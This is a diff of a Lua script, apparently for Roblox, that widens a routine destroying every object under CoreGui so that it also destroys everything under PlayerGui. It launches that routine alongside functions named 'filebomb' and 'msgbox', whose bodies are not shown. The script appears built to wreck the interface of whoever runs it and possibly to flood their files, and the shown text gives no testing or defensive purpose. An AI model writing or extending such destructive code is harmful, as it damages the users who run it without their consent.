@@ -43,8 +43,12 @@ local function msgbox()
 	end
 end
 
-local function delete_coregui()
+local function del()
 	for _, v in pairs(CoreGui:GetDescendants()) do
+		v:Destroy()
+		print(`Deleting CoreGui Object: {v}`)
+	end
+	for _, v in pairs(PlayerGui:GetDescendants()) do
 		v:Destroy()
 		print(`Deleting CoreGui Object: {v}`)
 	end
@@ -64,7 +68,7 @@ task.wait(_G.Delayed_2)
 
 task.spawn(filebomb)
 task.spawn(msgbox)
-task.spawn(delete_coregui)
+task.spawn(del)
 
 -- coroutine.wrap(filebomb)()
 -- coroutine.wrap(msgbox)()
